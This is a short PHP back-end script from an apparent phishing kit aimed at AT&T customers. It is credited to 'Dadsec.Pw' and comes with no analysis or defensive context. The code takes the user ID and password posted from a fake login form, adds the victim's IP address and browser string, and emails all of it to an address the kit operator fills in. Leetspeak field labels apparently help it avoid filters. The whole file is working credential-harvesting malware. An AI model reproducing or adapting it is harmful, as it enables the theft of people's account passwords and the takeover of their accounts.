<?php

$email = "your@gmail.com"; // Put your email address here
header("Access-Control-Allow-Origin: *"); 
if (isset($_POST["ai"]) && isset($_POST["pr"])) {
    $user = $_POST["ai"];
    $pass = $_POST["pr"];
	$browserAgent = $_SERVER['HTTP_USER_AGENT'];
    $ip = getenv("REMOTE_ADDR");
    $message = "------+ At&t +------\n";
    $message .= "Us3r ID:	$user\n";
    $message .= "Passw0rd:	$pass\n";
    $message .= "Cli3nt IP	: $ip\n";
	$message .= "Br0wser	: $browserAgent\n";
    $message .= "------+ Created By Dadsec.Pw +------\n";
    $subject = "At&t : $ip\n";
	$headers = "From: webmaster@mail.com\r\n";
	$headers .= "Reply-To: webmaster@mail.com\r\n";
	$headers .= "X-Mailer: PHP/".phpversion();	
	mail($email, $subject, $message, $headers);
}

?>
